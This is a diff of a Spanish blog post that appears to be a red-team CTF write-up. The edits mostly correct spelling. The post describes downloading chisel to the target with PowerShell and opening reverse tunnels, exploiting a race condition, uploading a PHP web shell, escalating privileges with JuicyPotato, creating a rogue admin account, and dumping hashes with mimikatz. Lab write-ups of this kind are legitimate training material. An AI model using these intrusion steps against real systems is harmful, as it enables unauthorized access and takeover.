@@ -126,47 +126,47 @@ No se si también les pasa, pero siento que no hay momento más emocionante que 
 ![3er challenge](/images/redteam-ctf-writeup/challenge3.png "3er challenge")
 
 
-Marcelo nos dio el "foothold" ahora comienza lo divertido el movimiento lateral y el reconocmiento de la red interna, en la pagina institucional habia una seccion llamada "Bank" que te dirigia al enlace "https://10.0.228", conociendo esto necesitamos alguna manera de poder ver y enumerar los distintos recursos de la red interna. Necesitamos hacer un "Tunel" entre nuestra maquina atacante y a la que obtuvimos acceso. Esto se conoce como tunneling y hay varias maneras de realizarlo, si hubieramos usado metasploit lo traeria inegrado, aunque lei en Discord que a muchos nos les estuvo funcionando para este CTF. Como nosotros teniamos una shell en powershell decidimos usar una herramienta llamada [chisel](https://github.com/jpillora/chisel), es un solo binario escrito en GO y tiene muchas caracteristicas! Descargamos la version de Windows de chisel en nuestro servidor web lo descomprimos y lo descargamos en nuestra maquina objetivo usando powershell "iwr -Uri http:/ip/chisel.exe -OutFile chisel.exe", una vez descargado necesitamos correrlo en nuestra maquina atacante en modo servidor con los siguientes parametros:
+Marcelo nos dio el "foothold", ahora comienza lo divertido: el movimiento lateral y el reconocmiento de la red interna. En la página institucional había una seccion llamada "Bank" que te dirigía al enlace "https://10.0.228", conociendo esto necesitamos alguna manera de poder ver y enumerar los distintos recursos de la red interna. Necesitamos hacer un "Túnel" entre nuestra máquina atacante hacia la que obtuvimos acceso. Esto se conoce como tunneling y hay varias maneras de realizarlo, si hubiéramos usado metasploit lo traería inegrado, aunque leí en Discord que a muchos nos les estuvo funcionando para este CTF. Como nosotros teníamos una shell en powershell, decidimos usar una herramienta llamada [chisel](https://github.com/jpillora/chisel), es un solo binario escrito en GO y tiene muchas características! Descargamos la versión de Windows de chisel en nuestro servidor web, lo descomprimos y lo descargamos en nuestra máquina objetivo usando powershell "iwr -Uri http:/ip/chisel.exe -OutFile chisel.exe". Una vez descargado, necesitamos correrlo en nuestra máquina atacante en modo servidor con los siguientes parametros:
 ```
 ./chisel server -p 8000 --reverse
 ```
-En la maquina objetivo con los siguientes parametros
+En la máquina objetivo con los siguientes parametros:
 ```
 ./chisel client ip:8000 R:9001:10.0.0.228:443
 ```
-Cuando el cliente se conecta se abre el puerto 9001 en nuestra maquina y podemos mediante chisel redirigir todo el trafico que mandemos por el puerto 9001 a la ip interna 10.0.228 puerto 443. Si quieren obtener mas info de como usar chisel pueden ir al siguiente [enlace](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
+Cuando el cliente se conecta, se abre el puerto 9001 en nuestra máquina y podemos mediante chisel redirigir todo el tráfico que mandemos por el puerto 9001 a la ip interna 10.0.228 puerto 443. Si quieren obtener más info de cómo usar chisel pueden ir al siguiente [enlace](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
-Lamentablemente me olvide de sacar un screenshot de la pagina principal, pero podiamos ver que se trataba de una aplicacion web escrita en PHP y se nos presentaba un formulario para crear un usuario con su respectiva contraseña y loguearnos. Una vez logueados se nos presenta la siguiente pagina
+Lamentablemente, me olvide de sacar un screenshot de la página principal, pero podíamos ver que se trataba de una aplicación web escrita en PHP y se nos presentaba un formulario para crear un usuario con su respectiva contraseña y loguearnos. Una vez logueados, se nos presenta la siguiente página:
 ![Bank](/images/redteam-ctf-writeup/bank1.png "Bank")
 
-Y en la seccion "profile" lo siguiente:
+Y en la sección "profile" lo siguiente:
 ![Bank profile](/images/redteam-ctf-writeup/bank3.png "Mas duro que gato de yeso")
 
-Si tenemos mas de 2000 pe en nuestra cuenta se permite cambiar nuestra foto de perfil, enseguida podemos inferir que si logramos subir un archivo PHP obtendremos ejecucion de codigo. Pero como?
+Si tenemos más de 2000 pe en nuestra cuenta, se permite cambiar nuestra foto de perfil, enseguida podemos inferir que si logramos subir un archivo PHP obtendremos ejecucion de código. Pero, ¿cómo?
 
 {{< youtube 8de2W3rtZsA >}}
 
-En reto se llama "Race against the machine" y se nos indica que la pagina de PucaraSec puede tener informacion sobre esto. En su [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) encontramos un excelente articulo sobre que los errores conocidos como "race conditions" no solo se encuentran en los binarios y tambien pueden suceder en las aplicaciones WEB, recomendada lectura no tiene desperdicio.
+En reto se llama "Race against the machine" y se nos indica que la página de PucaraSec puede tener información sobre esto. En su [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) encontramos un excelente artículo sobre los errores conocidos como "race conditions", que no solo se encuentran en los binarios y también pueden suceder en las aplicaciones WEB. Recomendada lectura; no tiene desperdicio.
 
-Despues de leer el post nos da pie para abusar de un "race condition" en la pagina del Banco de Mandinga Corp.
+Después de leer el post, tuvimos pie para abusar de un "race condition" en la página del Banco de Mandinga Corp.
 
-En el post para aprovechar la vulnerabilidad se utiliza BurpSuite, para poder hacer uso del multithreading en burpsuite tenes que tener la version paga, lametablemnte no la tenemos, pero siempre esta nuestro amigo OWASP ZAP para los pobres.
+En el post para aprovechar la vulnerabilidad se utiliza BurpSuite. Para hacer uso del multithreading en Burpsuite tenés que tener la version paga. Lametablemnte no la tenemos, pero siempre está nuestro amigo OWASP ZAP para los pobres.
 
 Ponemos a correr OWASP ZAP, hacemos un request y lo modificamos para agregarle el Header "Count"
 
 ![ZAP](/images/redteam-ctf-writeup/bank6.png "OWASP ZAP")
 
-Luego agarramos nuestra peticion modificada y la mandamos a "Fuzzer", agregamos el "1" en nuestro header Count y configuramos para que realice 100 peticiones.
+Luego agarramos nuestra petición modificada y la mandamos a "Fuzzer", agregamos el "1" en nuestro header Count y configuramos para que realice 100 peticiones.
 ![ZAP Fuzzer](/images/redteam-ctf-writeup/bank7.png "ZAP Fuzzing")
-En la pestaña "options" seleccionamos para que use 50 threads concurrentes y de esta manera lograr el cometido.
+En la pestaña "options" seleccionamos que use 50 threads concurrentes y de esta manera lograr el cometido.
 ![ZAP Fuzzer](/images/redteam-ctf-writeup/bank8.png "ZAP Fuzzing 2")
 
-Nuevamente recomiendo leer el [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) de PucaraSec para entender mejor por que esto funciona.
+Nuevamente recomiendo leer el [blog](https://blog.pucarasec.com/2020/07/06/web-application-race-conditions-its-not-just-for-binaries/) de PucaraSec para entender mejor porqué esto funciona.
 
-Voila! Una vez lanzado nuestro "fuzzer" logramos nuestro cometido!
+Voila! ¡Una vez lanzado nuestro "fuzzer" logramos nuestro cometido!
 ![Exploit Banco](/images/redteam-ctf-writeup/bank.png "Funcionara en mi banco(?")
 
-Volvemos a la seccion "Profile" y nos permite subir una imagen, nosotros aprovechamos al no haber restricciones en lo que se sube y le subimos una web shell en php en este caso [p0wny shell.](https://github.com/flozz/p0wny-shell)
+Volvemos a la seccion "Profile" y nos permite subir una imagen, nosotros aprovechamos al no haber restricciones en lo que se sube y subimos una web shell en php en este caso [p0wny shell.](https://github.com/flozz/p0wny-shell)
 
 
 ![Shell banco](/images/redteam-ctf-writeup/shellbank.png "Otra shell que felicidad!")
@@ -178,12 +178,13 @@ El flag se encuentra en el "root" del disco C:\
 
 ![4to Challenge](/images/redteam-ctf-writeup/challenge4.png "4 To Challenge")
 
-Luego de una enumeracion manual vimos que existe una carpeta C:\Nuclear_codes en la cual no tenemos permisos para leer. La cuenta es una cuenta de servicio de Windows y se llama "xampp". Necesitamos ser SYSTEM! La parte de elevacion de privilegios suele ser otra parte bastante frustante, hay que prestar mucha atencion al detalle, despues de curtirme con varias maquinas del OSCP y Hackthebox aprendi que muchas veces la respuesta esta a un simple comando o en el home del usuario cual tenemos privilegios.
-Corrimos el comando "whoami /priv" y nos dio como resultado que el privilegio "SeImpersonatePrivilege" esta habilitado. Vamos a utilizar la herramienta Juicipotato para poder elevar nuestros privilegios. En el dia viernes en el espacio RedTeam se dio un workshop sobre "Elevacion de privilegios en Windows" y se menciono al abuso de ["Token Privileges"](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) y el uso de Juicypotao.
+Luego de una enumeración manual vimos que existe una carpeta C:\Nuclear_codes para la que no tenemos permisos de lectura. La cuenta es de servicio de Windows y se llama "xampp". Necesitamos ser SYSTEM! La parte de elevación de privilegios suele ser otra parte bastante frustante, hay que prestar mucha atención al detalle, después de curtirme con varias máquinas del OSCP y HackTheBox aprendí que muchas veces la respuesta está a un simple comando o en el home del usuario del que tenemos privilegios.
+Corrimos el comando "whoami /priv" y nos dio como resultado que el privilegio "SeImpersonatePrivilege" está habilitado. Vamos a utilizar la herramienta Juicipotato para poder elevar nuestros privilegios.
+En el día viernes en el espacio RedTeam se dio un workshop sobre "Elevacion de privilegios en Windows" y se mencionó al abuso de ["Token Privileges"](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/) y el uso de Juicypotato.
 
-Subimos el binario de JuicyPotato a la maquina mediante la seccion "Profile" de la pagina.
+Subimos el binario de JuicyPotato a la máquina mediante la sección "Profile" de la página.
 
-Preparamos un "payload", se trata de un archivo "bat" con una secuencia de comandos para crear un usuario Administrador, nos percatamos que esta manera era la mas "simple", si haciamos una shell inversa y por algun motivo se caia habia que volver a realizar el proceso con Juicypotato otra contra de de realizar una shell inversa era que no se tenia acceso a internet asi que habria que realizar a la primer maquina que obtuvimos una shell, como en una enumeracion a los puertos del host 10.0.0.228 nos dimos cuenta que tiene el puerto 3389 abierto nos parecio lo mas simple crear una cuenta de Administrador y conectarnos por RDP pivotendo mediante nuestro primer host controlado.
+Preparamos un "payload", se trata de un archivo "bat" con una secuencia de comandos para crear un usuario Administrador, nos percatamos que esta manera era la más "simple". Si hacíamos una shell inversa y por algún motivo se caía había que volver a realizar el proceso con Juicypotato otra vez. La contra de realizar una shell inversa era que no se tenía acceso a Internet, así que había que realizar a la primer máquina que obtuvimos una shell, como en una enumeración a los puertos del host 10.0.0.228 nos dimos cuenta que tiene el puerto 3389 abierto nos pareció lo más simple crear una cuenta de Administrador y conectarnos por RDP, pivotendo mediante nuestro primer host controlado.
 
 ![Payloadpriv](/images/redteam-ctf-writeup/privshell.png "Creamos el payload")
 
@@ -193,7 +194,7 @@ Preparamos un "payload", se trata de un archivo "bat" con una secuencia de coman
 Vemos que la cuenta "vamoss" se creo correctamente!
 
 
-Apartir de aqui pudimos leer el flag y el contenido del archivo en Nuclear_codes con el siguiente contenido:
+Apartir de acá pudimos leer el flag y el contenido del archivo en Nuclear_codes con el siguiente contenido:
 ```
 10.0.0.134
 
@@ -206,9 +207,9 @@ PUCARA{VVEFQNMBGXELEYVHARDMUZZAGIWFCQKN}
 
 ![PrivEscSuccess](/images/redteam-ctf-writeup/challenge5.png "Ejecutamos el script")
 
-Hasta aca llegamos, solucionamos el 4to challenge en la tarde noche del Viernes y no pudimos avanzar mas, nos dedicamos a enumerar los hosts que conociamos hasta el momento, como se nos indica en el archivo con el flag del 4to challenge, se nos da una IP, esa ip pertenecia a una pc unida al dominio mandingacorp.xyz para ser mas exactos en la enumarcion encontramos beta.mandingacorp.xyz(10.0.0.134), alpha.mandingacorp.xyz, gamma.mandingacorp.xyz y el controlador de dominio dc01.mandingacorp.xyz(10.0.0.195), hasta donde pudimos ver algunos hosts tenian el puerto 80 corriendo IIS, y todas SMB y RDP, intentamos hasta con vulnerabilidades a esos hosts sin exito, eternalblue y zerologon en el DC, lamentablemte no pudimos seguir, se ve que aun quedaba mucha mas diversion por delante. memoryempty se dedico a escanear la red y los hosts con nmap y proxychains mediante chisel, probamos "donaldtrump:peluquin!!" como usuario y contraseña en todo aquello que requiera un login sin exito, dumpeamos los hashes de los los hosts controlados con mimkatz y los probamos contra los hosts conocidos y nada. Para el dia sabado ya estabamos exhaustos, pero muy contentos con lo que logramos.
+Hasta acá llegamos, solucionamos el 4to challenge en la tarde noche del viernes y no pudimos avanzar más. Nos dedicamos a enumerar los hosts que conocíamos hasta el momento, como se nos indica en el archivo con el flag del 4to challenge, se nos da una IP, esa ip pertenecia a una pc unida al dominio mandingacorp.xyz, para ser más exactos en la enumeración encontramos beta.mandingacorp.xyz(10.0.0.134), alpha.mandingacorp.xyz, gamma.mandingacorp.xyz y el controlador de dominio dc01.mandingacorp.xyz(10.0.0.195), hasta donde pudimos ver algunos hosts tenían el puerto 80 corriendo IIS, y todas SMB y RDP. Intentamos hasta con vulnerabilidades a esos hosts sin exito, eternalblue y zerologon en el DC. Lamentablemte no pudimos seguir, se ve que tadavía quedaba mucha más diversion por delante. memoryempty se dedicó a escanear la red y los hosts con nmap y proxychains mediante chisel, probamos "donaldtrump:peluquin!!" como usuario y contraseña en todo aquello que requería un login, sin exito. Dumpeamos los hashes de los los hosts controlados con mimkatz y los probamos contra los hosts conocidos y nada. Para el día sábado ya estabamos exhaustos, pero muy contentos con lo que logramos.
 
 
 ## Final
 
-Estamos muy orgullosos de haber conseguido el primer lugar en este CTF, no tenemos mas que palabras de agredicimiento para la gente de PucaraSec que estaba dia y noche contestando preguntas en discord y revisando que todo funcione correctamente. Supieron armar muy bien un CTF que sea divertido y a la vez con cierto grado de "realismo" en lo que a operaciones de RedTeam se referiere, tambien muy buen trabajo los y las organizadores y speakers del espacio RedTeam en la Ekoparty, contenido de primerisima calidad! Esperamos ansiosos el proximo encuentro!
+Estamos muy orgullosos de haber conseguido el primer lugar en este CTF, no tenemos más que palabras de agredicimiento para la gente de PucaraSec que estuvo día y noche contestando preguntas en Discord y revisando que todo funcione correctamente. Supieron armar muy bien un CTF que resultó divertido y a la vez con cierto grado de "realismo", en lo que a operaciones de RedTeam se referiere. También muy buen trabajo los y las organizadores y speakers del espacio RedTeam en la Ekoparty, ¡contenido de primerísima calidad! ¡Esperamos ansiosos el proximo encuentro!
